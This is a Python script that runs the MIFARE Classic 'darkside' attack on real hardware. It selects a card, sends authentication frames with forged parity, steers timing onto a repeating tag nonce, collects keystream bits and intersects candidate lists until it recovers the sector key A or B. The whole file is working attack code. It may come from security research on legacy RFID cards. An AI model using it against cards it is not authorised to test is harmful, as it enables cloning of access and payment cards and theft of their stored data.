#!/usr/bin/env python3
"""Darkside on hardware via the chip collector (memrw OP_DARKSIDE) + the recovery in darkside.py.
The prototype of the app's mfDarkside (nfcprobe mfc.c; `nfcnet.py HOST darkside BLOCK` runs that):
the on-chip loop steers onto a repeating tag nonce and collects the 8 NACK keystreams.

    darkside_hw.py HOST [block] [keyB]

Each OP_DARKSIDE call is one run (one locked nt + its ks[8], or a partial failure). The host runs
several, intersects the candidate key lists (darkside.nonce2key), and reports / checks the survivor.
"""
import sys
import time

import rawa
from mfc import pack
from rawa import with_crc
import darkside

NR_WIRE = 0xAABBCC00 & 0xFFFFFF1F   # fixed on-wire reader nonce (last 3 bits = nt_diff)
AR_WIRE = 0x11223344                # fixed on-wire reader response


def build(uid4, block, keyB):
    """(steps, acode, aframe, nrar_frames[8]) for a 4-byte-UID card, mirroring mfChkKeys."""
    bcc = uid4[0] ^ uid4[1] ^ uid4[2] ^ uid4[3]
    steps = [
        (1, 0x40, 0, with_crc(b"\x50\x00")),             # HLTA (no answer)
        (1, 0x07, 1, b"\x52"),                           # WUPA (7 bits)
        (1, 0x70, 1, b"\x93\x70" + uid4 + bytes([bcc])), # SELECT CL1 (HW adds CRC)
    ]
    cmd = bytes([0x61 if keyB else 0x60, block])
    aframe, acode = pack(with_crc(cmd))
    nrar = []
    for c in range(8):
        nr = (NR_WIRE & 0xFFFFFF1F) | (c << 5)
        data = nr.to_bytes(4, "big") + AR_WIRE.to_bytes(4, "big")
        fifo, _ = pack(data, par=[0] * 8)                # fake (all-zero) parity
        nrar.append(fifo)
    return steps, acode, aframe, nrar


def main():
    host = sys.argv[1]
    block = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    keyB = len(sys.argv) > 3 and sys.argv[3] in ("1", "b", "B")

    s = rawa.RawA(host)
    if not s.start():
        print("could not activate a card")
        return
    uid = bytes(s.uid)
    print(f"uid {uid.hex().upper()}, attacking block {block} key {'B' if keyB else 'A'}")
    if len(uid) != 4:
        print("only 4-byte UIDs handled in this prototype")
        return
    steps, acode, aframe, nrar = build(uid, block, keyB)
    uidi = int.from_bytes(uid, "big")

    # Calibrate ticks-per-nonce-step: fire two AUTHs a known PROBE ticks apart, measure the distance.
    PROBE = 6000
    tps = None
    for _ in range(8):
        nt0, nt1, _, _, _ = s.mon.darkside(steps, acode, aframe, nrar, PROBE, maxiter=2)
        d = darkside.dist_nt(nt0, nt1)
        if d:
            tps = PROBE / abs(d)
            print(f"  calib: d {d} over {PROBE} ticks -> {tps:.3f} ticks/step")
            break
    if not tps:
        print("could not calibrate")
        return

    # Refine the grid spacing to one PRNG period (65535 steps; the advance at a fixed spacing is
    # deterministic, so this is a closed loop) until it is well inside the op's steering window.
    sync = round(65535 * tps)
    for _ in range(16):
        nt0, nt1, _, _, _ = s.mon.darkside(steps, acode, aframe, nrar, sync, maxiter=2)
        a = darkside.dist_nt(nt0, nt1)
        print(f"  refine: sync {sync} advance {a}")
        if a is None:
            continue
        if abs(a) <= 8:
            break
        sync -= round(a * tps)

    tq = round(tps * 256)
    common = None
    runs = 0
    t0 = time.time()
    for attempt in range(12):
        nt, _, ks, mask, hits = s.mon.darkside(steps, acode, aframe, nrar, sync, tq=tq)
        if mask != 0xFF:
            print(f"  run: nt {nt:08X} mask {mask:02X} hits {hits}")
            continue
        runs += 1
        ks_info = sum(ks[c] << ((7 - c) * 8) for c in range(8))
        cand = set(darkside.nonce2key(uidi, nt, NR_WIRE, AR_WIRE, 0, ks_info))
        # the common-prefix recovery misses the key ~1 run in 10: then go on from this run alone
        common = cand if not common or not (common & cand) else (common & cand)
        print(f"  run {runs}: nt {nt:08X}, {len(cand)} cands, intersection {len(common)}  "
              f"({time.time() - t0:.1f}s)")
        if len(common) <= 1:
            break

    if common:
        for k in sorted(common):
            print(f"candidate key: {k:012X}")
    else:
        print("no candidates")


if __name__ == "__main__":
    main()
